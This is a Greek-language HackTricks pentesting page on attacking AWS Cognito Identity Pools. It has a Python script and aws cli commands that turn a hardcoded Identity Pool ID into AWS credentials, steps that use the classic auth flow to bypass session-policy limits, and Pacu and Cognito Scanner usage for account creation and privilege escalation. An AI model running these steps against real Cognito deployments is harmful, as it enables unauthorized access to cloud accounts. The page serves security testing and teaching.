# Πιστοποιητικά Ταυτότητας Cognito

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ κάνοντας υποβολή PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Βασικές Πληροφορίες

Τα πιστοποιητικά ταυτότητας διαδραματίζουν ένα κρίσιμο ρόλο επιτρέποντας στους χρήστες σας να **αποκτούν προσωρινές διαπιστεύσεις**. Αυτές οι διαπιστεύσεις είναι απαραίτητες για την πρόσβαση σε διάφορες υπηρεσίες του AWS, συμπεριλαμβανομένων αλλά όχι περιοριστικά του Amazon S3 και του DynamoDB. Μια σημαντική λειτουργία των πιστοποιητικών ταυτότητας είναι η υποστήριξή τους τόσο για ανώνυμους επισκέπτες όσο και για μια σειρά παρόχων ταυτότητας για την πιστοποίηση των χρηστών. Οι υποστηριζόμενοι πάροχοι ταυτότητας περιλαμβάνουν:

- Πιστοποιητικά χρηστών Amazon Cognito
- Κοινωνικές επιλογές σύνδεσης όπως Facebook, Google, Σύνδεση με το Amazon και Σύνδεση με το Apple
- Πάροχοι συμμόρφωσης με το OpenID Connect (OIDC)
- Πάροχοι ταυτότητας SAML (Security Assertion Markup Language)
- Πιστοποιημένες ταυτότητες από προγραμματιστές
```python
# Sample code to demonstrate how to integrate an identity provider with an identity pool can be structured as follows:
import boto3

# Initialize the Amazon Cognito Identity client
client = boto3.client('cognito-identity')

# Assume you have already created an identity pool and obtained the IdentityPoolId
identity_pool_id = 'your-identity-pool-id'

# Add an identity provider to the identity pool
response = client.set_identity_pool_roles(
IdentityPoolId=identity_pool_id,
Roles={
'authenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/AuthenticatedRole',
'unauthenticated': 'arn:aws:iam::AWS_ACCOUNT_ID:role/UnauthenticatedRole',
}
)

# Print the response from AWS
print(response)
```
### Cognito Sync

Για να δημιουργήσετε συνεδρίες Identity Pool, πρέπει πρώτα να **δημιουργήσετε ένα Identity ID**. Αυτό το Identity ID είναι η **ταυτοποίηση της συνεδρίας αυτού του χρήστη**. Αυτές οι ταυτοποιήσεις μπορούν να έχουν έως και 20 σύνολα δεδομένων που μπορούν να αποθηκεύουν έως και 1MB από ζεύγη κλειδιών-τιμών.

Αυτό είναι **χρήσιμο για να διατηρείτε πληροφορίες ενός χρήστη** (ο οποίος θα χρησιμοποιεί πάντα το ίδιο Identity ID).

Επιπλέον, η υπηρεσία **cognito-sync** είναι η υπηρεσία που επιτρέπει να **διαχειρίζεστε και συγχρονίζετε αυτές τις πληροφορίες** (στα σύνολα δεδομένων, αποστέλλοντας πληροφορίες σε ροές και μηνύματα SNS...).

### Εργαλεία για pentesting

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), το πλαίσιο εκμετάλλευσης AWS, περιλαμβάνει τώρα τα modules "cognito\_\_enum" και "cognito\_\_attack" που αυτοματοποιούν την απαρίθμηση όλων των περιουσιών Cognito σε ένα λογαριασμό και εντοπίζουν αδύναμες ρυθμίσεις, χαρακτηριστικά χρήστη που χρησιμοποιούνται για έλεγχο πρόσβασης, κ.λπ., και επίσης αυτοματοποιούν τη δημιουργία χρήστη (συμπεριλαμβανομένης της υποστήριξης MFA) και την ανάδειξη προνομίων βασισμένη σε τροποποιήσιμα προσαρμοσμένα χαρακτηριστικά, διαθέσιμα διαπιστευτήρια Identity Pool, ρόλοι που μπορούν να υιοθετηθούν σε αναγνωριστικά ταυτότητας, κ.λπ.

Για μια περιγραφή των λειτουργιών των modules, δείτε το μέρος 2 της [ανάρτησης στο blog](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2). Για οδηγίες εγκατάστασης, δείτε την κύρια σελίδα του [Pacu](https://github.com/RhinoSecurityLabs/pacu).

#### Χρήση

Παράδειγμα χρήσης του cognito\_\_attack για να προσπαθήσετε τη δημιουργία χρήστη και όλων των διανυσματικών προνομίων εναντίον ενός συγκεκριμένου identity pool και πελάτη user pool:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Δείγμα χρήσης του cognito\_\_enum για τη συλλογή όλων των ομάδων χρηστών, πελατών ομάδας χρηστών, ομάδων ταυτότητας, χρηστών κλπ. που είναι ορατά στο τρέχον AWS λογαριασμό:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner) είναι ένα εργαλείο γραμμής εντολών σε Python που υλοποιεί διάφορες επιθέσεις στο Cognito συμπεριλαμβανομένης της μη επιθυμητής δημιουργίας λογαριασμού και της αύξησης της πιστοποίησης του identity pool.

#### Εγκατάσταση
```bash
$ pip install cognito-scanner
```
#### Χρήση
```bash
$ cognito-scanner --help
```
Για περισσότερες πληροφορίες ελέγξτε το https://github.com/padok-team/cognito-scanner

## Πρόσβαση σε Ρόλους IAM

### Μη ταυτοποιημένος

Το μόνο πράγμα που χρειάζεται ένας επιτιθέμενος για να **αποκτήσει διαπιστευτήρια AWS** σε μια εφαρμογή Cognito ως μη ταυτοποιημένος χρήστης είναι το **Identity Pool ID**, και αυτό το **ID πρέπει να είναι σκληροκωδικοποιημένο** στην ιστοσελίδα/κινητή **εφαρμογή** για να το χρησιμοποιήσει. Ένα ID φαίνεται κάπως έτσι: `eu-west-1:098e5341-8364-038d-16de-1865e435da3b` (δεν μπορεί να υποστεί δοκιμή με βία).

{% hint style="success" %}
Ο **ρόλος IAM Cognito μη ταυτοποιημένου που δημιουργείται μέσω** είναι προεπιλεγμένα με το όνομα `Cognito_<Όνομα Identity Pool>Unauth_Role`
{% endhint %}

Αν βρείτε ένα Identity Pool ID που έχει σκληροκωδικοποιηθεί και επιτρέπει σε μη ταυτοποιημένους χρήστες, μπορείτε να αποκτήσετε διαπιστευτήρια AWS με:
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
Ή μπορείτε να χρησιμοποιήσετε τις ακόλουθες **εντολές aws cli**:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
Σημειώστε ότι από προεπιλογή ένας μη ταυτοποιημένος χρήστης Cognito **ΔΕΝ μπορεί να έχει καμία άδεια, ακόμη κι αν του έχει ανατεθεί μέσω πολιτικής**. Ελέγξτε την ακόλουθη ενότητα.
{% endhint %}

### Βελτιωμένη έναντι Βασικής Ροής Ταυτοποίησης

Η προηγούμενη ενότητα ακολούθησε τη **βασική βελτιωμένη ροή ταυτοποίησης από προεπιλογή**. Αυτή η ροή ορίζει μια **περιοριστική** [**πολιτική συνεδρίας**](../../aws-basic-information/#session-policies) στη συνεδρία ρόλου IAM που δημιουργήθηκε. Αυτή η πολιτική θα επιτρέψει μόνο στη συνεδρία να [**χρησιμοποιεί τις υπηρεσίες από αυτή τη λίστα**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services) (ακόμη κι αν ο ρόλος είχε πρόσβαση σε άλλες υπηρεσίες).

Ωστόσο, υπάρχει ένας τρόπος να παρακάμψετε αυτό, αν το **Identity pool έχει ενεργοποιημένη τη "Βασική (Κλασική) Ροή"**, ο χρήστης θα μπορεί να λάβει μια συνεδρία χρησιμοποιώντας αυτή τη ροή η οποία **δεν θα έχει αυτήν την περιοριστική πολιτική συνεδρίας**.

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
Εάν λάβετε αυτό το **σφάλμα**, είναι επειδή η **βασική ροή δεν είναι ενεργοποιημένη (προεπιλογή)**

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

Έχοντας ένα σύνολο διαπιστευτήρια IAM, θα πρέπει να ελέγξετε [ποια πρόσβαση έχετε](../../#whoami) και να προσπαθήσετε να [εξελίξετε τα προνόμια](../../aws-privilege-escalation/).

### Ελέγχοντας την ταυτοποίηση

{% hint style="info" %}
Θυμηθείτε ότι οι **ελεγμένοι χρήστες** πιθανόν να έχουν **διαφορετικές άδειες**, οπότε αν μπορείτε να **εγγραφείτε μέσα στην εφαρμογή**, δοκιμάστε να το κάνετε και να λάβετε τα νέα διαπιστευτήρια.
{% endhint %}

Ενδέχεται επίσης να υπάρχουν **ρόλοι** διαθέσιμοι για **ελεγμένους χρήστες που έχουν πρόσβαση στο Identity Pool**.

Για αυτό μπορεί να χρειαστεί να έχετε πρόσβαση στον **πάροχο ταυτότητας**. Αν αυτός είναι ένας **Cognito User Pool**, ίσως μπορείτε να εκμεταλλευτείτε την προεπιλεγμένη συμπεριφορά και **να δημιουργήσετε ένα νέο χρήστη μόνοι σας**.

{% hint style="success" %}
Ο **ρόλος IAM Cognito που δημιουργήθηκε μέσω ελέγχου ταυτότητας** ονομάζεται προεπιλεγμένα `Cognito_<Όνομα Identity Pool>Auth_Role`
{% endhint %}

Πάντως, το **παρακάτω παράδειγμα** υποθέτει ότι έχετε ήδη συνδεθεί μέσα σε ένα **Cognito User Pool** που χρησιμοποιείται για πρόσβαση στο Identity Pool (μην ξεχνάτε ότι μπορεί επίσης να έχουν ρυθμιστεί και άλλοι τύποι παρόχων ταυτότητας).

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# Λάβετε το identity_id από την προηγούμενη απάντηση της εντολής
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# Στο IdToken μπορείτε να βρείτε τους ρόλους στους οποίους έχει πρόσβαση ένας χρήστης λόγω των Ομάδων του User Pool
# Χρησιμοποιήστε το --custom-role-arn για να λάβετε διαπιστευτήρια για ένα συγκεκριμένο ρόλο
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
Είναι δυνατόν να **ρυθμιστούν διαφορετικοί ρόλοι IAM ανάλογα με τον πάροχο ταυτότητας** στον οποίο συνδέεται ο χρήστης ή ακόμα και ανάλογα **με τον χρήστη** (χρησιμοποιώντας διεκδικήσεις). Επομένως, αν έχετε πρόσβαση σε διαφορετικούς χρήστες μέσω του ίδιου ή διαφορετικούς παρόχους, μπορεί να αξίζει να συνδεθείτε και να έχετε πρόσβαση στους ρόλους IAM όλων τους.
{% endhint %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}
